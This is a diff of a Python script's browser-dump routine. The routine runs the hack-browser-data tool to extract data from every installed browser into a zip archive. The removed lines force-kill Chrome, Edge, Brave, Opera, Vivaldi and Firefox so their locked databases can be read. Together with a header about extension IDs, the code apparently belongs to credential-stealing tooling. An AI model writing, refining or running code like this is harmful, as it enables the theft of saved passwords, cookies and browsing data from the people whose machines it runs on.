@@ -67,65 +67,30 @@ def run_cmd(cmd, timeout=60):
         return None
 
 # ============ BROWSER DUMP ============
-BROWSER_PROCS = ["chrome.exe","brave.exe","msedge.exe","opera.exe","vivaldi.exe","firefox.exe"]
-
-def kill_browsers():
-    """Kill running browsers so HBD can read their locked SQLite files."""
-    killed = []
-    for proc in BROWSER_PROCS:
-        r = subprocess.run(["taskkill","/f","/im",proc], capture_output=True)
-        if r.returncode == 0:
-            killed.append(proc)
-    if killed:
-        log.info("Killed browsers: " + ", ".join(killed))
-        time.sleep(2)  # let file handles release
-    return killed
-
 def dump_all_browsers():
     if not HBD_EXE.exists():
-        log.warning("HBD exe not found — skipping browser dump")
-        # Return a dummy empty zip so the rest of the pipeline still runs
-        dummy = BROWSER_DUMP_DIR / "empty.zip"
-        BROWSER_DUMP_DIR.mkdir(parents=True, exist_ok=True)
-        with zipfile.ZipFile(str(dummy), 'w') as zf:
-            zf.writestr("no_hbd.txt", "hack-browser-data.exe not found")
-        return dummy
-
-    killed_browsers = kill_browsers()
+        log.error(f"HBD exe not found: {HBD_EXE}")
+        sys.exit(1)
 
     if BROWSER_DUMP_DIR.exists():
         shutil.rmtree(BROWSER_DUMP_DIR, ignore_errors=True)
     BROWSER_DUMP_DIR.mkdir(parents=True, exist_ok=True)
 
     cmd = [str(HBD_EXE), "dump", "--browser", "all", "--format", "json", "--dir", str(BROWSER_DUMP_DIR), "--zip"]
-    log.info("Executing: " + " ".join(cmd))
+    log.info(f"Executing: {' '.join(cmd)}")
     result = run_cmd(cmd, timeout=120)
-
     if result is None:
-        log.warning("HBD timed out — skipping browser data")
-        dummy = BROWSER_DUMP_DIR / "timeout.zip"
-        with zipfile.ZipFile(str(dummy), 'w') as zf:
-            zf.writestr("hbd_timeout.txt", "HBD timed out")
-        return dummy
-
+        log.error("HBD timed out")
+        sys.exit(1)
     if result.returncode != 0:
-        log.warning("HBD returned " + str(result.returncode) + " — checking for partial zip")
+        log.warning(f"HBD returned {result.returncode}, but may still have produced zip.")
 
-    # HBD names the zip after the output dir
     generated_zip = BROWSER_DUMP_DIR / (BROWSER_DUMP_DIR.name + ".zip")
     if not generated_zip.exists():
-        # Sometimes HBD uses a different name — find any .zip in the dir
-        zips = list(BROWSER_DUMP_DIR.glob("*.zip"))
-        if zips:
-            generated_zip = zips[0]
-            log.info("Found zip: " + str(generated_zip))
-        else:
-            log.warning("No zip from HBD — creating placeholder")
-            generated_zip = BROWSER_DUMP_DIR / "no_data.zip"
-            with zipfile.ZipFile(str(generated_zip), 'w') as zf:
-                zf.writestr("hbd_no_output.txt", "HBD produced no zip")
+        log.error(f"Expected zip not found: {generated_zip}")
+        sys.exit(1)
 
-    log.info("Browser dump: " + str(generated_zip) + " (" + str(int(generated_zip.stat().st_size/1024)) + " KB)")
+    log.info(f"Browser dump: {generated_zip} ({generated_zip.stat().st_size/1024:.1f} KB)")
     return generated_zip
 
 # ============ EXTENSION IDS & ROOTS ============
